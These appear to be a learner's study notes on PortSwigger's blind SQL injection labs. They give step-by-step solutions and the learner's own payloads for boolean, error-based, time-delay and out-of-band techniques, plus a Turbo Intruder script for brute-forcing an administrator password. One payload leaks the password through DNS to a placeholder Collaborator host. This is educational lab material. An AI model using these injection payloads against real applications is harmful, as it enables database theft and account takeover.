
# Blind SQL injection 

Many instances of SQL injection are blind vulnerabilities. This means that the application does not return the results of the SQL query or the details of any database errors within its responses.

## Exploiting blind SQL injection by triggering conditional responses

An application that uses tracking cookies to gather analytics about usage. When a request containing a *TrackingId* cookie is processed, the application determines whether this is a know user using an SQL query like this:

``` SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' ```

The application does behave differently depending on whether the query returns any data. If it returns data (because a recognized *TrackingId* was submitted), then a "Welcome back" message is displayed within the page.

### Blind SQL injection with conditional responses

The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

**Solution**
1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the *TrackingId* cookie. For simplicity, let's say the original value of the cookie is *TrackingId=xyz*.
2. Modify the *TrackingId* cookie, changing it to:

    ``` TrackingId=xyz' AND '1'='1 ```

    Verify that the "Welcome back" message appears in the response.

3. Now change it to:

    ``` TrackingId=xyz' AND '1'='2 ```

    Verify that the "Welcome back" message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.

4. Now change it to:

    ``` TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a ```

    Verify that the condition is true, confirming that there is a table called *users*.
5. Now change it to:

    ``` TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a ```

    Verify that the condition is true, confirming that there is a user called *administrator*.
6. The next step is to determine how many characters are in the password of the *administrator* user. To do this, change the value to:

    ``` TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a ```

    This condition should be true, confirming that the password is greater than 1 character in length.
7. Send a series of follow-up values to test different password lengths. Send:

    ``` TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a ```

    Then send:

    ``` TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a ```

    And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the "Welcome back" message disappears), you have determined the length of the password, which is in fact 20 characters long.
8. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
9. In the Positions tab of Burp Intruder, clear the default payload positions by clicking the "Clear §" button.
10. In the Positions tab, change the value of the cookie to:

    ``` TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a ```

    This uses the *SUBSTRING()* function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
11. Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):

    ``` TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§ ```
12. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under "Payload Options" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
13. To be able to tell when the correct character was submitted, you'll need to grep each response for the expression "Welcome back". To do this, go to the Options tab, and the "Grep - Match" section. Clear any existing entries in the list, and then add the value "Welcome back".
14. Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.
15. Review the attack results to find the value of the character at the first position. You should see a column in the results called "Welcome back". One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.
16. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value:

    ``` TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a ```

17. Launch the modified attack, review the results, and note the character at the second offset.
18. Continue this process testing offset 3, 4, and so on, until you have the whole password.
19. In your browser, click "My account" to open the login page. Use the password to log in as the *administrator* user.

**My comment**

``` 'k5FAbL0pQ5lRNgcB' AND 1=1’-- ```

this will evaluate Welcome back message

``` 'k5FAbL0pQ5lRNgcB' AND (SELECT 'x' FROM users LIMIT 1)='x'--' ```

This will find out that administrator user exist and it shows me welcome back message

```'k5FAbL0pQ5lRNgcB' AND (SELECT username FROM users where username='administrator')='administrator'--'```

Find length of password send it to Intruder then Payloads and Payloads type is numbers and check the password >1

```'k5FAbL0pQ5lRNgcB' AND (SELECT username FROM users where username='administrator' AND LENGTH (password)>1)='administrator'--'```

Find the password send it to Intruder then Payloads and Payloads type is brute forcer and highlite a character and set min and max length to 1

```'k5FAbL0pQ5lRNgcB' AND (SELECT substring(password,1,1) FROM users where username='administrator')='a'--'```

then I select first 1 in password,1,1 and 'a' character and set it in Position as cluster bomb and choose first as numbers and second one ac brute force like before in Payloads.

**Turbo Intruder**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for i in range(1, 21):
        #engine.queue(target.req, str(i))
        list_abc = list('abcdefghijklmnopqrstuvwxyz0123456789')
        #char_list = ['a',...]
        for j in list_abc:
            engine.queue(target.req, [str(i), j])

def handleResponse(req, interesting):
    #if interesting:
    if len(req.response) == 11199:
        table.add(req)
```
## Inducing conditional responses by triggering SQL errors

### Blind SQL injection with conditional errors

**Solution**
1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. For simplicity, let's say the original value of the cookie is *TrackingId=xyz*.
2. Modify the *TrackingId* cookie, appending a single quotation mark to it:

    ``` TrackingId=xyz' ```

    Verify that an error message is received.
3. Now change it to two quotation marks:

    ``` TrackingId=xyz'' ```

    Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.

4. You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:

    ``` TrackingId=xyz'||(SELECT '')||' ```

    In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:

    ``` TrackingId=xyz'||(SELECT '' FROM dual)||' ```

    As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all *SELECT* statements to explicitly specify a table name.
5. Now that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:

    ``` TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||' ```

    This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.
6. As long as you make sure to always inject syntactically valid SQL queries, you can use this error response to infer key information about the database. For example, in order to verify that the users table exists, send the following query:

    ``` TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||' ```

    As this query does not return an error, you can infer that this table does exist. Note that the ``` WHERE ROWNUM = 1 ``` condition is important here to prevent the query from returning more than one row, which would break our concatenation.
7. You can also exploit this behavior to test conditions. First, submit the following query:

    ``` TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' ```

    Verify that an error message is received.
8. Now change it to:

    ``` TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' ```

    Verify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The *CASE* statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is *true*.
9. You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username *administrator* exists:

    ``` TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' ```
    Verify that the condition is true (the error is received), confirming that there is a user called *administrator*.
10. The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:

    ``` TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||' ```

    This condition should be true, confirming that the password is greater than 1 character in length.
11. Send a series of follow-up values to test different password lengths. Send:

    ``` TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' ```

    Then send:

    ``` TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' ```

    And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the error disappears), you have determined the length of the password, which is in fact 20 characters long.
12. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
13. In the Positions tab of Burp Intruder, clear the default payload positions by clicking the "Clear §" button.
14. In the Positions tab, change the value of the cookie to:

    ``` TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' ```

    This uses the *SUBSTR()* function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
15. Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):

    ``` TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' ```

16. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under "Payload Options" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
17. Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.
18. Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The "Status" column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position.
19. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value:

    ``` TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' ```
20. Launch the modified attack, review the results, and note the character at the second offset.
21. Continue this process testing offset 3, 4, and so on, until you have the whole password.
22: In your browser, click "My account" to open the login page. Use the password to log in as the *administrator* user.

**My comment**

First try to put ' at the end of TrackingID = this will occur an error if I put another '' then it will works 

This will occur an error

```jBLFcMbX0aiwI7lY'||(SELECT ‘')||'```

This will works, when I specified table name, that means that the target using Oracle database

```jBLFcMbX0aiwI7lY'||(SELECT '' FROM dual)||’```

It will throw an error message when I specified table name that doesnot exist

```jBLFcMbX0aiwI7lY'||(SELECT '' FROM pokus)||’```

Because this doesnot throw error, I know that this table exist 

```jBLFcMbX0aiwI7lY'||(SELECT '' FROM users WHERE ROWNUM = 1)||’```

Error message

```'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||’```

There the error disappears 

```'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' ```

Verify that the condition is true (the error is received), confirming that there is a user called administrator

```'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username=‘administrator')||```

If the condition is true then I know that password length is bigger then 1

```'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'```

Find a password 

```'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username=‘administrator')||'```

In turbo intruder I need to write %s 
when status code is 500 then the password is correct .

## Exploiting blind SQL injection by triggering time delays

### Blind SQL injection with time delays

The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

**Solution**
1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the *TrackingId* cookie.
2. Modify the *TrackingId* cookie, changing it to:

    ``` TrackingId=x'||pg_sleep(10)-- ```

3. Submit the request and observe that the application takes 10 seconds to respond.

**My comment**

```'||pg_sleep(10)--```

### Blind SQL injection with time delays and information retrieval

The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

**Solution**
1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the *TrackingId* cookie.
2. Modify the *TrackingId* cookie, changing it to:

    ``` TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- ```

    Verify that the application takes 10 seconds to respond.
3. Now change it to:

    ```TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--```

    Verify that the application responds immediately with no time delay. This demonstrates how you can test a single boolean condition and infer the result.
4. Now change it to:

    ``` TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- ```

    Verify that the condition is true, confirming that there is a user called *administrator*.
5. The next step is to determine how many characters are in the password of the *administrator* user. To do this, change the value to:

    ``` TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- ```

    This condition should be true, confirming that the password is greater than 1 character in length.
6. Send a series of follow-up values to test different password lengths. Send:

    ``` TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- ```

    Then send:

    ``` TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- ```

    And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the application responds immediately without a time delay), you have determined the length of the password, which is in fact 20 characters long.
7. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
8. In the Positions tab of Burp Intruder, clear the default payload positions by clicking the "Clear §" button.
9. In the Positions tab, change the value of the cookie to:

    ``` TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- ```

    This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
10. Place payload position markers around the a character in the cookie value. To do this, select just the a, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):

    ``` TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- ```

11. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lower case alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under "Payload Options" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
12. To be able to tell when the correct character was submitted, you'll need to monitor the time taken for the application to respond to each request. For this process to be as reliable as possible, you need to configure the Intruder attack to issue requests in a single thread. To do this, go to the "Resource pool" tab and add the attack to a resource pool with the "Maximum concurrent requests" set to 1.
13. Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.
14. Burp Intruder monitors the time taken for the application's response to be received, but by default it does not show this information. To see it, go to the "Columns" menu, and check the box for "Response received".
15. Review the attack results to find the value of the character at the first position. You should see a column in the results called "Response received". This will generally contain a small number, representing the number of milliseconds the application took to respond. One of the rows should have a larger number in this column, in the region of 10,000 milliseconds. The payload showing for that row is the value of the character at the first position.
16. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value:

    ``` TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- ```

17. Launch the modified attack, review the results, and note the character at the second offset.
18. Continue this process testing offset 3, 4, and so on, until you have the whole password.
19. In your browser, click "My account" to open the login page. Use the password to log in as the *administrator* user.

**My comment**

Determine password length:

```';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END—```

Use Burp Suite Intruder to get password one character at a time. If the server responds in more than 10 secs then we know guessed the character correctly.

```';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users—```

```';SELECT CASE WHEN (username='administrator') AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users—```

```';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--```

## Exploiting blind SQL injection using out-of-band (OAST) techniques

### Blind SQL injection with out-of-band interaction

The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

**Solution**
1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the *TrackingId* cookie.
2. Modify the *TrackingId* cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:

    ``` TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual-- ```

    The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use Burp Collaborator client to verify that your payload had indeed triggered a DNS lookup and potentially exploit this behavior to exfiltrate sensitive data from the application. We'll go over this technique in the next lab.

**My comment**

```' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-COLLABORATOR-ID.burpcollaborator.net/"> %remote ;]>'),'/l') FROM dual--```

### Blind SQL injection with out-of-band data exfiltration

The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

**Solution**
1. Visit the front page of the shop, and use Burp Suite Professional to intercept and modify the request containing the *TrackingId* cookie.
2. Go to the Burp menu, and launch the Burp Collaborator client.
3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
4. Modify the *TrackingId* cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:

    ``` TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual-- ```

5. Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously.
6. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the *administrator* user should appear in the subdomain of the interaction, and you can view this within the Burp Collaborator client. For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab.
7. In your browser, click "My account" to open the login page. Use the password to log in as the *administrator* user.

**My comment**

It is needed burp profesional 

```'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--```